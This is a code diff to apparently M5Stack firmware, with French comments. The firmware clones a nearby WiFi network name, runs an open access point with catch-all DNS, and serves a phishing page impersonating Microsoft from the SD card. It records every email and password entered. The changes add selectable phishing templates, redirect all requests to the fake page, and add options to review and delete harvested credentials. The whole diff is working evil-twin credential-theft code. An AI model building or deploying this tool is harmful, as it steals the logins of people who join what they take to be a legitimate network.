@@ -10,17 +10,21 @@ WebServer server(80);
 DNSServer dnsServer;
 const byte DNS_PORT = 53;
 
-
-
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "WiFi Details" , "Start Captive Portal", "Stop Captive Portal" , "Check credentials" };
+const char* menuItems[] = {"Scan WiFi", "Select Network", "WiFi Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials" };
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 String ssidList[30];
 int numSsid = 0;
 bool isOperationInProgress = false;
 int currentListIndex = 0;
 String clonedSSID = "";  // Pour stocker le SSID cloné
+
+
+String portalFiles[10]; // Supposons que vous avez au maximum 10 fichiers
+int numPortalFiles = 0;
+String selectedPortalFile = "/sites/microsoft.html"; // Fichier par défaut
+int portalFileIndex = 0; // Index du fichier actuellement sélectionné
 
 
 void setup() {
@@ -47,7 +51,7 @@ void setup() {
   M5.Display.setCursor(80, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   // Ajouter un délai avant de passer à la suite du programme
-  delay(2000);
+  delay(1000);
    // Initialiser ssidList avec un SSID par défaut
     ssidList[0] = "Scan before please";
     numSsid = 1; // Mettre à jour le nombre de SSID dans la liste
@@ -102,7 +106,13 @@ void executeMenuItem(int index) {
       stopCaptivePortal();
       break;
     case 5:
+      changePortal();
+      break;
+    case 6:
       checkCredentials();
+      break;
+    case 7:
+      deleteCredentials();
       break;
   }
   isOperationInProgress = false;
@@ -118,26 +128,29 @@ void handleMenuInput() {
 }
 
 void drawMenu() {
-  M5.Display.clear();
-  M5.Display.setTextSize(2);
-  M5.Display.setTextFont(1);
+    M5.Display.clear();
+    M5.Display.setTextSize(2); // Taille du texte agrandie
+    M5.Display.setTextFont(1);
 
-  int lineHeight = 18;
-  int startX = 10;
-  int startY = 25;
+    int lineHeight = 24; // Ajusté pour la nouvelle taille du texte
+    int startX = 10;
+    int startY = 25;
 
-  for (int i = 0; i < menuSize; i++) {
-    if (i == currentIndex) {
-      M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_DARKGREY);
-      M5.Display.setTextColor(TFT_GREEN);
-    } else {
-      M5.Display.setTextColor(TFT_WHITE);
+    for (int i = 0; i < menuSize; i++) {
+        if (i == currentIndex) {
+            // Ajuster le remplissage pour correspondre à la taille du texte
+            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
+            M5.Display.setTextColor(TFT_GREEN);
+        } else {
+            M5.Display.setTextColor(TFT_WHITE);
+        }
+        // Centrer le texte dans la zone grisée
+        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
+        M5.Display.println(menuItems[i]);
     }
-    M5.Display.setCursor(startX, startY + i * lineHeight + 5);
-    M5.Display.println(menuItems[i]);
-  }
-  M5.Display.display();
+    M5.Display.display();
 }
+
 
 void scanWifiNetworks() {
   WiFi.mode(WIFI_STA);
@@ -165,7 +178,7 @@ void showWifiList() {
   M5.Display.setTextSize(2);
   for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit); i++) {
     if (i == currentListIndex) {
-      M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_DARKGREY);
+      M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
       M5.Display.setTextColor(TFT_GREEN);
     } else {
       M5.Display.setTextColor(TFT_WHITE);
@@ -282,9 +295,9 @@ void cloneSSIDForCaptivePortal(String ssid) {
 }
 
 void createCaptivePortal() {
-    String ssid = clonedSSID.isEmpty() ? "CheckThisOut" : clonedSSID;
+    String ssid = clonedSSID.isEmpty() ? "FreeWifi" : clonedSSID;
     WiFi.mode(WIFI_AP);
-    WiFi.softAP(ssid.c_str());
+    WiFi.softAP(clonedSSID.c_str());
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
 
     server.on("/", HTTP_GET, []() {
@@ -292,19 +305,28 @@ void createCaptivePortal() {
         String password = server.arg("password");
         if (!email.isEmpty() && !password.isEmpty()) {
             saveCredentials(email, password);
-        }
-
-        File webFile = SD.open("/microsoft.html"); // Assurez-vous que le fichier est correctement nommé et placé
-        if (webFile) {
-            server.streamFile(webFile, "text/html");
-            webFile.close();
+            server.send(200, "text/plain", "Credentials Saved");
         } else {
-            server.send(404, "text/plain", "File not found");
+            servePortalFile(selectedPortalFile);
         }
     });
 
+    server.onNotFound([]() {
+        servePortalFile(selectedPortalFile); // Ou toute autre logique nécessaire
+    });
+
     server.begin();
-    waitAndReturnToMenu("Portal\n"+ ssid +"\nDeployed");
+    waitAndReturnToMenu("Portal\n" + ssid + "\nDeployed");
+}
+
+void servePortalFile(const String& filename) {
+    File webFile = SD.open(filename);
+    if (webFile) {
+        server.streamFile(webFile, "text/html");
+        webFile.close();
+    } else {
+        server.send(404, "text/plain", "File not found");
+    }
 }
 
 void saveCredentials(const String& email, const String& password) {
@@ -353,6 +375,57 @@ void readCredentialsFromFile() {
     }
 }
 
+
+void listPortalFiles() {
+    File root = SD.open("/sites");
+    numPortalFiles = 0;
+    while (File file = root.openNextFile()) {
+        if (!file.isDirectory()) {
+            portalFiles[numPortalFiles++] = String("/sites/") + file.name();
+            if (numPortalFiles >= 10) break;
+        }
+        file.close();
+    }
+    root.close();
+}
+
+void changePortal() {
+    listPortalFiles();
+    M5.Display.clear();
+    M5.Display.setTextSize(2);
+    M5.Display.setTextColor(TFT_WHITE);
+    M5.Display.setCursor(10, 10);
+    M5.Display.println("Select Portal:");
+    
+    for (int i = 0; i < numPortalFiles; i++) {
+        M5.Display.setCursor(10, 30 + i * 20);
+        if (i == portalFileIndex) {
+            M5.Display.setTextColor(TFT_GREEN);
+        } else {
+            M5.Display.setTextColor(TFT_WHITE);
+        }
+        // Afficher uniquement le nom de fichier pour la lisibilité
+        M5.Display.println(portalFiles[i].substring(7)); // Supprimer '/sites/' du nom affiché
+    }
+    M5.Display.display();
+    
+    while (!inMenu) {
+        M5.update();
+        if (M5.BtnA.wasPressed()) {
+            portalFileIndex = max(0, portalFileIndex - 1);
+            changePortal();
+        } else if (M5.BtnC.wasPressed()) {
+            portalFileIndex = min(numPortalFiles - 1, portalFileIndex + 1);
+            changePortal();
+        } else if (M5.BtnB.wasPressed()) {
+            selectedPortalFile = portalFiles[portalFileIndex];
+            inMenu = true;
+            waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected"); // Supprimer '/sites/' du nom affiché
+        }
+    }
+}
+
+
 void checkCredentials() {
     readCredentialsFromFile();
     const int listDisplayLimit = M5.Display.height() / 18;
@@ -362,7 +435,7 @@ void checkCredentials() {
     M5.Display.setTextSize(2);
     for (int i = listStartIndex; i < min(numCredentials, listStartIndex + listDisplayLimit); i++) {
         if (i == currentListIndex) {
-            M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_DARKGREY);
+            M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
             M5.Display.setTextColor(TFT_GREEN);
         } else {
             M5.Display.setTextColor(TFT_WHITE);
@@ -388,13 +461,30 @@ void checkCredentials() {
     }
 }
 
+void deleteCredentials() {
+    // Ouvrir le fichier en mode écriture pour effacer son contenu
+    File file = SD.open("/credentials.txt", FILE_WRITE);
+    if (file) {
+        // Fermer le fichier pour sauvegarder le contenu vide
+        file.close();
+        // Afficher le message de confirmation
+        waitAndReturnToMenu("Deleted successfully");
+        Serial.println("Credentials deleted successfully");
+    } else {
+        // Afficher un message d'erreur
+        waitAndReturnToMenu("Error..");
+        Serial.println("Error opening file for deletion");
+    }
+}
+
+
 void waitAndReturnToMenu(String message) {
   M5.Display.clear();
   M5.Display.setTextSize(2);
   M5.Display.setCursor(30, M5.Display.height() / 2);
   M5.Display.println(message);
   M5.Display.display();
-  delay(1500);
+  delay(1000);
   inMenu = true;
   drawMenu();  // Redessiner le menu après l'opération
 }
